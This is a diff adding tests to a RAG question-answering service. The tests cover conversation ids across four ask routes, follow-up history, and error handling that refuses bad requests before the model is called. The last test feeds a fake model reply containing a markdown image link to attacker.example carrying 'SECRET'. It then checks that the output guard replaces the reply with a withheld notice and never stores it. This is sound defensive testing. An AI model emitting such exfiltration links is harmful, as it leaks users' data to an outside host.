@@ -2,9 +2,13 @@
 and the pipeline's stream() (rag/query/pipeline.py)."""
 
 import json
+import re
+
+import pytest
 
 from rag.common.llm import FakeLLM, LLMResult, StreamPiece
 from rag.query.guard import BLOCKED
+from rag.query.history import HISTORY_HEADER
 from tests.test_api import COMPACTION, REPLICATION, make_client, make_pdf, upload
 
 
@@ -401,3 +405,97 @@ def test_the_page_shows_why_the_models_did_not_load(tmp_path):
     client, _ = make_client(tmp_path)
     page = client.get("/").text
     assert "h.error" in page and "Could not start" in page
+
+
+# ---- conversations: the id on every route (phase 2) ----------------------------------------------
+
+ROUTES = ("one document", "one document, streamed", "all documents", "all documents, streamed")
+
+
+def answer_of(client, url, body):
+    """The answer of one ask: the JSON body, or the data of the final event of a stream."""
+    response = client.post(url, json=body)
+    assert response.status_code == 200, response.text
+    if url.endswith("/stream"):
+        assert response.headers["content-type"].startswith("text/event-stream")
+        events = frames(response)
+        assert events[-1][0] == "final", events[-1]
+        return events[-1][1]
+    return response.json()
+
+
+def _route_url(route, doc_id):
+    return {
+        "one document": f"/v1/documents/{doc_id}/ask",
+        "one document, streamed": f"/v1/documents/{doc_id}/ask/stream",
+        "all documents": "/v1/ask",
+        "all documents, streamed": "/v1/ask/stream",
+    }[route]
+
+
+@pytest.mark.parametrize("route", ROUTES)
+def test_all_four_ask_routes_return_a_conversation_id_and_a_follow_up_uses_it(tmp_path, route):
+    seen = []
+    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: seen.append(u) or "Copies live on several nodes [S1]."))
+    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
+    url = _route_url(route, doc_id)
+    first = answer_of(client, url, {"question": "What does replication keep?"})
+    assert re.fullmatch(r"[0-9a-f]{32}", first["conversation_id"])
+    assert first["turn"] == 1 and HISTORY_HEADER not in seen[-1]  # a first question has no history
+    follow = answer_of(client, url, {"question": "And why does that help?", "conversation_id": first["conversation_id"]})
+    assert follow["conversation_id"] == first["conversation_id"] and follow["turn"] == 2
+    assert HISTORY_HEADER in seen[-1] and "What does replication keep?" in seen[-1]
+
+
+def test_questions_without_an_id_start_separate_conversations(tmp_path):
+    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies live on several nodes [S1]."))
+    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
+    url = f"/v1/documents/{doc_id}/ask"
+    ordinary = answer_of(client, url, {"question": "How does replication work?"})
+    streamed = frames(ask_stream(client, doc_id, "How does replication work?"))[-1][1]
+    null = answer_of(client, url, {"question": "How does replication work?", "conversation_id": None})  # null is absent
+    ids = [ordinary["conversation_id"], streamed["conversation_id"], null["conversation_id"]]
+    assert len(set(ids)) == 3, ids
+    assert [ordinary["turn"], streamed["turn"], null["turn"]] == [1, 1, 1]
+
+
+def test_conversation_errors_arrive_before_any_model_call_or_sse_byte(tmp_path):
+    seen = []
+    client, service = make_client(tmp_path, llm=FakeLLM(lambda s, u: seen.append(u) or "Copies live on several nodes [S1]."))
+    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
+    single = answer_of(client, f"/v1/documents/{doc_id}/ask", {"question": "What does replication keep?"})["conversation_id"]
+    across = answer_of(client, "/v1/ask", {"question": "What does replication keep?"})["conversation_id"]
+    calls = len(seen)
+
+    def refused(url, cid, status, detail):
+        response = client.post(url, json={"question": "And why?", "conversation_id": cid})
+        assert response.status_code == status, (url, response.status_code, response.text)
+        assert not response.headers["content-type"].startswith("text/event-stream")  # no stream was started
+        assert response.json() == {"detail": detail}
+
+    refused(f"/v1/documents/{doc_id}/ask/stream", "0" * 32, 404, "no such conversation")
+    refused("/v1/ask/stream", single, 404, "no such conversation")  # a single-document id in the all-documents scope
+    service.conversations.max_turns = 1
+    full = "this conversation is full; start a new conversation"
+    refused(f"/v1/documents/{doc_id}/ask/stream", single, 409, full)
+    refused("/v1/ask/stream", across, 409, full)
+    assert len(seen) == calls  # no refusal reached the model
+
+
+def test_a_hostile_streamed_answer_is_stored_as_the_withheld_notice(tmp_path):
+    reply = {"text": "Copies live on several nodes, so reads survive a failure [S1]."}
+    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: reply["text"]))
+    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
+    events = frames(ask_stream(client, doc_id, "What does replication keep?"))
+    final = events[-1][1]
+    assert "".join(d["text"] for n, d in events if n == "token") == final["answer"]
+    cid = final["conversation_id"]
+    path = tmp_path / "uploads" / doc_id / "chat" / "conversations" / f"{cid}.json"
+    assert json.loads(path.read_text(encoding="utf-8"))["turns"][0]["answer"] == final["answer"]  # stored as shown
+
+    reply["text"] = "Sure, here you go. ![x](https://attacker.example/p.png?d=SECRET) and that is all."
+    hostile = frames(ask_stream(client, doc_id, "And why does that help?", conversation_id=cid))[-1][1]
+    assert hostile["answer"] == BLOCKED
+    raw = path.read_text(encoding="utf-8")
+    assert json.loads(raw)["turns"][1]["answer"] == BLOCKED  # the notice the client saw, not the model's text
+    assert "attacker.example" not in raw and "SECRET" not in raw
